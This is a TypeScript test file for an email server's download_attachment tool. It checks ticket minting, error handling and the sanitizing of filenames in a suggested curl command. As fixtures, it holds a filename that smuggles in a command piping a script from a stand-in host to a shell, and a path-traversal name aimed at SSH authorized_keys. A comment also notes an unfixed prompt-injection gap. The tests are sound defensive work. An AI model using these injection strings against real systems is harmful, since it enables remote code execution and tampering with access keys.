import { describe, expect, test } from 'bun:test'
import { type McpServer } from '@modelcontextprotocol/sdk/server/mcp.js'

import { type EmailDetailRecord, type EmailGetDetailParams, type JmapLive, type JmapSession } from '@langmail/jmap'

import { type Ticket, type TicketInput, type TicketStore } from '../attachments/tickets.ts'
import { READ_ONLY } from './annotations.ts'
import {
  downloadAttachment,
  downloadAttachmentInput,
  makeLiveDeps,
  registerDownloadAttachment,
} from './download-attachment.ts'

const PUBLIC = 'https://mcp.example.com'

const EMAIL: EmailDetailRecord = {
  attachments: [
    {
      blobId: 'Gd41d8cd',
      disposition: 'attachment',
      name: 'invoice-2026-06.pdf',
      partId: '2',
      size: 186_778,
      type: 'application/pdf',
    },
  ],
  id: 'e1',
  subject: 'Invoice',
}

const makeDeps = (emails: EmailDetailRecord[]) => {
  const minted: TicketInput[] = []
  const fetched: EmailGetDetailParams[] = []
  const resolved: string[] = []
  return {
    deps: {
      emailGetDetail: (p: EmailGetDetailParams) => {
        fetched.push(p)
        return Promise.resolve(emails)
      },
      mintTicket: (input: TicketInput) => {
        minted.push(input)
        return 'tok3n'
      },
      publicUrl: PUBLIC,
      resolveAccountId: (authorization: string) => {
        resolved.push(authorization)
        return Promise.resolve('acct')
      },
    },
    fetched,
    minted,
    resolved,
  }
}

describe('downloadAttachmentInput schema', () => {
  test('requires non-empty emailId and blobId', () => {
    expect(downloadAttachmentInput.safeParse({ blobId: 'b', emailId: 'e' }).success).toBe(true)
    expect(downloadAttachmentInput.safeParse({ blobId: '', emailId: 'e' }).success).toBe(false)
    expect(downloadAttachmentInput.safeParse({ emailId: 'e' }).success).toBe(false)
  })
})

describe('downloadAttachment', () => {
  test('mints a ticket and returns metadata plus the capability URL', async () => {
    const { deps, minted } = makeDeps([EMAIL])
    const result = await downloadAttachment(deps, { args: { blobId: 'Gd41d8cd', emailId: 'e1' }, token: 'secret' })
    const txt = result.content[0]?.text ?? ''
    expect(result.isError).toBeUndefined()
    expect(txt).toContain('invoice-2026-06.pdf (application/pdf, 182.4 KB)')
    expect(txt).toContain('expires in 24 hours')
    expect(txt).toContain(`${PUBLIC}/attachments/tok3n`)
    expect(txt).toContain("curl -sS -o 'invoice-2026-06.pdf'")
    // The ticket binds the canonical server-side name/type, not client input.
    expect(minted).toEqual([
      {
        accountId: 'acct',
        authorization: 'Bearer secret',
        blobId: 'Gd41d8cd',
        name: 'invoice-2026-06.pdf',
        type: 'application/pdf',
      },
    ])
    // The bearer must never leak into the model-visible result.
    expect(txt).not.toContain('secret')
  })

  test('a hostile filename cannot break out of the suggested curl command', async () => {
    const { deps } = makeDeps([
      {
        attachments: [
          {
            blobId: 'b1',
            name: "x'; curl evil.example | sh; '.pdf",
            partId: '2',
            size: 100,
            type: 'application/pdf',
          },
        ],
        id: 'e1',
        subject: 'Trap',
      },
    ])
    const result = await downloadAttachment(deps, { args: { blobId: 'b1', emailId: 'e1' }, token: 'tok' })
    const txt = result.content[0]?.text ?? ''
    // The curl example must contain no raw quote from the sender-controlled
    // name — nothing can close the single-quoted -o argument early.
    expect(txt).toContain("curl -sS -o 'x_; curl evil.example | sh; _.pdf'")
    expect(txt).not.toContain("-o 'x';")
  })

  test('errors on an unknown email id', async () => {
    const { deps } = makeDeps([])
    const result = await downloadAttachment(deps, { args: { blobId: 'b', emailId: 'nope' }, token: 'tok' })
    expect(result.isError).toBe(true)
    expect(result.content[0]?.text).toContain('nope')
  })

  test('errors when the blobId is not an attachment of that message', async () => {
    const { deps, minted } = makeDeps([EMAIL])
    const result = await downloadAttachment(deps, { args: { blobId: 'other', emailId: 'e1' }, token: 'tok' })
    expect(result.isError).toBe(true)
    expect(result.content[0]?.text).toContain('other')
    expect(minted).toHaveLength(0)
  })

  test('reads only the requested message, with maxBodyValueBytes capped to metadata size', async () => {
    const { deps, fetched, resolved } = makeDeps([EMAIL])
    await downloadAttachment(deps, { args: { blobId: 'Gd41d8cd', emailId: 'e1' }, token: 'secret' })
    expect(fetched).toEqual([
      {
        accountId: 'acct',
        // The live wiring fills the real apiUrl in; the tool itself passes none.
        apiUrl: '',
        authorization: 'Bearer secret',
        ids: ['e1'],
        maxBodyValueBytes: 16,
      },
    ])
    // The account lookup gets the built header, not the bare token — only the
    // `Bearer ` form is one Better Auth will accept.
    expect(resolved).toEqual(['Bearer secret'])
  })

  test('picks the requested attachment out of several on the message', async () => {
    const { deps, minted } = makeDeps([
      {
        attachments: [
          { blobId: 'b1', name: 'cover.png', partId: '2', size: 12, type: 'image/png' },
          { blobId: 'b2', name: 'contract.pdf', partId: '3', size: 2048, type: 'application/pdf' },
        ],
        id: 'e1',
      },
    ])
    const result = await downloadAttachment(deps, { args: { blobId: 'b2', emailId: 'e1' }, token: 'tok' })
    const txt = result.content[0]?.text ?? ''
    expect(txt).toContain('contract.pdf (application/pdf, 2.0 KB)')
    expect(txt).not.toContain('cover.png')
    // The ticket binds the matched part, not simply the first one.
    expect(minted[0]?.blobId).toBe('b2')
    expect(minted[0]?.name).toBe('contract.pdf')
  })

  test('errors when the message carries no attachments at all', async () => {
    const { deps, minted } = makeDeps([{ id: 'e1', subject: 'Plain' }])
    const result = await downloadAttachment(deps, { args: { blobId: 'b1', emailId: 'e1' }, token: 'tok' })
    expect(result.isError).toBe(true)
    expect(result.content[0]?.text).toContain('No attachment with blobId b1')
    expect(minted).toHaveLength(0)
  })

  test('falls back to generic name, type and size when the part carries none', async () => {
    const { deps, minted } = makeDeps([
      { attachments: [{ blobId: 'b1', partId: '2' }], id: 'e1', subject: 'Bare part' },
    ])
    const result = await downloadAttachment(deps, { args: { blobId: 'b1', emailId: 'e1' }, token: 'tok' })
    const txt = result.content[0]?.text ?? ''
    expect(result.isError).toBeUndefined()
    expect(txt).toContain('attachment (application/octet-stream, 0 B)')
    expect(txt).toContain("curl -sS -o 'attachment'")
    // The ticket binds the same fallbacks the caller was shown.
    expect(minted[0]?.name).toBe('attachment')
    expect(minted[0]?.type).toBe('application/octet-stream')
  })

  test('a traversal filename cannot escape the agent working directory', async () => {
    const { deps } = makeDeps([
      {
        attachments: [{ blobId: 'b1', name: '../../.ssh/authorized_keys', partId: '2', size: 64, type: 'text/plain' }],
        id: 'e1',
        subject: 'Trap',
      },
    ])
    const result = await downloadAttachment(deps, { args: { blobId: 'b1', emailId: 'e1' }, token: 'tok' })
    const txt = result.content[0]?.text ?? ''
    // Every separator becomes an underscore first, so the dot-stripping only
    // ever sees the first `..` — the later ones survive as literal dots. Which
    // is harmless: with no separator left, the whole thing is one filename in
    // the current directory.
    expect(txt).toContain("curl -sS -o '_.._.ssh_authorized_keys'")
    expect(txt).not.toContain("-o '../")
  })

  test('a filename that sanitizes away entirely falls back to "attachment"', async () => {
    const { deps, minted } = makeDeps([
      { attachments: [{ blobId: 'b1', name: '..', partId: '2', size: 1, type: 'text/plain' }], id: 'e1' },
    ])
    const result = await downloadAttachment(deps, { args: { blobId: 'b1', emailId: 'e1' }, token: 'tok' })
    expect(result.content[0]?.text).toContain("curl -sS -o 'attachment'")
    // Only the curl example is sanitized here; the ticket keeps the canonical
    // name, and the download route applies its own, separate sanitizing.
    expect(minted[0]?.name).toBe('..')
  })

  test('a separator-only filename becomes underscores rather than the fallback', async () => {
    const { deps } = makeDeps([
      { attachments: [{ blobId: 'b1', name: '///', partId: '2', size: 1, type: 'text/plain' }], id: 'e1' },
    ])
    const result = await downloadAttachment(deps, { args: { blobId: 'b1', emailId: 'e1' }, token: 'tok' })
    expect(result.content[0]?.text).toContain("curl -sS -o '___'")
  })

  test('a newline in a filename reaches the metadata line; only the curl example is sanitized', async () => {
    const { deps } = makeDeps([
      {
        attachments: [{ blobId: 'b1', name: 'report\n\tsummary.pdf', partId: '2', size: 10, type: 'application/pdf' }],
        id: 'e1',
      },
    ])
    const result = await downloadAttachment(deps, { args: { blobId: 'b1', emailId: 'e1' }, token: 'tok' })
    const txt = result.content[0]?.text ?? ''
    expect(txt).toContain("curl -sS -o 'report__summary.pdf'")
    // KNOWN GAP, not a guarantee: only the curl example goes through
    // shellSafeFilename, so the raw sender-controlled name — newline and all —
    // lands in the model-visible metadata line. That is an indirect
    // prompt-injection surface, and it is not specific to this tool: format.ts
    // and draft-common.ts render attachment and sender names into tool results
    // just as unsanitized. Sanitizing it is a behaviour change and belongs in
    // its own PR across that whole surface; when that lands, update this
    // assertion rather than reading it as the intended contract.
    expect(txt.startsWith('report\n\tsummary.pdf (application/pdf, 10 B)')).toBe(true)
  })
})

const session = (over: Partial<JmapSession> = {}): JmapSession => ({
  apiUrl: 'https://mail.example.com/jmap/',
  downloadUrl: 'https://mail.example.com/jmap/download/{accountId}/{blobId}/{name}?accept={type}',
  primaryAccounts: { 'urn:ietf:params:jmap:mail': 'acct' },
  uploadUrl: 'https://mail.example.com/jmap/upload/{accountId}/',
  ...over,
})

const liveStub = (over: Partial<JmapLive> = {}, sessionFor: string[] = []): JmapLive => ({
  getSession: (authorization) => {
    sessionFor.push(authorization)
    return Promise.resolve(session())
  },
  resolveAccountId: () => Promise.resolve('acct'),
  ...over,
})

interface FetchCall {
  headers: Record<string, string> | undefined
  url: string
}

const ticketStoreStub = (): { minted: TicketInput[]; store: TicketStore } => {
  const minted: TicketInput[] = []
  return {
    minted,
    store: {
      lookup: (): Ticket | null => null,
      mint: (input) => {
        minted.push(input)
        return 'tok3n'
      },
    },
  }
}

describe('makeLiveDeps', () => {
  test("emailGetDetail reaches the apiUrl discovered from the session, forwarding the caller's bearer", async () => {
    const calls: FetchCall[] = []
    const sessionFor: string[] = []
    const originalFetch = globalThis.fetch
    globalThis.fetch = ((input: string, init?: RequestInit) => {
      calls.push({ headers: init?.headers as Record<string, string> | undefined, url: String(input) })
      return Promise.resolve(Response.json({ methodResponses: [['Email/get', { list: [EMAIL] }, '0']] }))
    }) as unknown as typeof fetch
    try {
      const wired = makeLiveDeps(liveStub({}, sessionFor), ticketStoreStub().store, PUBLIC)
      const emails = await wired.emailGetDetail({
        accountId: 'acct',
        // The tool passes an empty apiUrl; the session's real one must win.
        apiUrl: '',
        authorization: 'Bearer tok',
        ids: ['e1'],
        maxBodyValueBytes: 16,
      })
      expect(emails).toEqual([EMAIL])
      expect(calls).toHaveLength(1)
      expect(calls[0]?.url).toBe('https://mail.example.com/jmap/')
      // The session is discovered with the caller's own bearer, and the same
      // one is forwarded to Stalwart — the tool never mints a credential.
      expect(sessionFor).toEqual(['Bearer tok'])
      expect(calls[0]?.headers?.authorization).toBe('Bearer tok')
    } finally {
      globalThis.fetch = originalFetch
    }
  })

  test("mintTicket is the store's own mint and publicUrl is passed through", () => {
    const { minted, store } = ticketStoreStub()
    const wired = makeLiveDeps(liveStub(), store, PUBLIC)
    expect(wired.publicUrl).toBe(PUBLIC)
    expect(wired.mintTicket).toBe(store.mint)
    expect(
      wired.mintTicket({
        accountId: 'acct',
        authorization: 'Bearer tok',
        blobId: 'b1',
        name: 'n.pdf',
        type: 'application/pdf',
      })
    ).toBe('tok3n')
    expect(minted).toHaveLength(1)
  })

  test('resolveAccountId is the live helper itself', async () => {
    const live = liveStub({ resolveAccountId: () => Promise.resolve('acct-42') })
    const wired = makeLiveDeps(live, ticketStoreStub().store, PUBLIC)
    expect(wired.resolveAccountId).toBe(live.resolveAccountId)
    expect(await wired.resolveAccountId('Bearer tok')).toBe('acct-42')
  })
})

type Registered = (args: unknown) => unknown

interface RegisteredConfig {
  annotations?: unknown
  description?: string
  title?: string
}

// A stand-in for the one method the registration wrapper calls, so the test
// drives the registered tool callback directly instead of through a transport.
const makeServer = (): {
  configs: Map<string, RegisteredConfig>
  registered: Map<string, Registered>
  server: McpServer
} => {
  const configs = new Map<string, RegisteredConfig>()
  const registered = new Map<string, Registered>()
  const server = {
    registerTool: (name: string, config: RegisteredConfig, cb: Registered) => {
      configs.set(name, config)
      registered.set(name, cb)
      return { name }
    },
  } as unknown as McpServer
  return { configs, registered, server }
}

describe('registerDownloadAttachment', () => {
  test('registers download_attachment as a read-only tool', () => {
    const { configs, registered, server } = makeServer()
    registerDownloadAttachment(server, makeDeps([EMAIL]).deps, () => 'tok')

    expect([...registered.keys()]).toEqual(['download_attachment'])
    const config = configs.get('download_attachment')
    expect(config?.annotations).toEqual(READ_ONLY)
    expect(config?.title).toBe('Download attachment')
    // The description steers the agent away from pulling bytes into context.
    expect(config?.description).toContain('never the file content')
    expect(config?.description).toContain('expires after 24 hours')
  })

  test('parses the args and delegates with a bearer built from the current token', async () => {
    const { deps, minted } = makeDeps([EMAIL])
    const { registered, server } = makeServer()
    // The token is read per call, so a rotated bearer is picked up.
    let token = 'first'
    registerDownloadAttachment(server, deps, () => token)
    const call = registered.get('download_attachment')

    token = 'second'
    const result = (await call?.({ blobId: 'Gd41d8cd', emailId: 'e1' })) as { content: { text: string }[] }
    expect(result.content[0]?.text).toContain(`${PUBLIC}/attachments/tok3n`)
    expect(minted[0]?.authorization).toBe('Bearer second')
  })

  test('the registered callback rejects args the schema does not accept', () => {
    const { deps, fetched, minted, resolved } = makeDeps([EMAIL])
    const { registered, server } = makeServer()
    let tokenReads = 0
    registerDownloadAttachment(server, deps, () => {
      tokenReads += 1
      return 'tok'
    })
    const call = registered.get('download_attachment')

    expect(() => call?.({ blobId: '', emailId: 'e1' })).toThrow()
    // Validation runs before anything else, so a malformed call never reads the
    // bearer and never reaches Stalwart.
    expect(tokenReads).toBe(0)
    expect(resolved).toHaveLength(0)
    expect(fetched).toHaveLength(0)
    expect(minted).toHaveLength(0)
  })
})
